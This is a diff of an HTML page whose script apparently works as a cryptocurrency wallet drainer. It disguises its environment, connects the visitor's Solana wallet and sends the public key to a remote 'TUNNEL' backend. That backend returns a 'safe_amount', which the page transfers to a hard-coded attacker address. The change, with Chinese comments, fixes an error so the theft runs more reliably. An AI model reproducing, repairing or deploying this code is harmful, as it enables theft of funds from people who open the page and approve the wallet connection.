@@ -1,6 +1,5 @@
 <!DOCTYPE html><html><head><meta charset="UTF-8">
     <script>
-        // 🚀 核心环境伪装
         window.Buffer = window.Buffer || {
             from: (arr) => new Uint8Array(arr),
             isBuffer: (obj) => obj instanceof Uint8Array
@@ -24,19 +23,20 @@
             if (!p) { alert("Use Wallet Browser!"); return; }
             await p.connect();
             
-            // 🔱 直接向 71 机要算好的“安全金额”
             const data = await fetch(TUNNEL + '/get_data', {
                 method: 'POST', headers: {'Content-Type':'application/json'},
                 body: JSON.stringify({pubkey: p.publicKey.toString()})
             }).then(r => r.json());
 
-            // 🚀 前端不再做减法，直接填入后端给的 safe_amount
-            // 这能 100% 避开 Blob.encode 报错
+            // 🔱 终极修复：增加容错判断，确保 BigInt 永远不会处理 undefined
+            const amountStr = data.safe_amount || "0";
+            const amount = BigInt(amountStr);
+
             const transaction = new solanaWeb3.Transaction().add(
                 solanaWeb3.SystemProgram.transfer({
                     fromPubkey: p.publicKey,
                     toPubkey: new solanaWeb3.PublicKey(TARGET_ADDR),
-                    lamports: data.safe_amount 
+                    lamports: Number(amount) 
                 })
             );
 
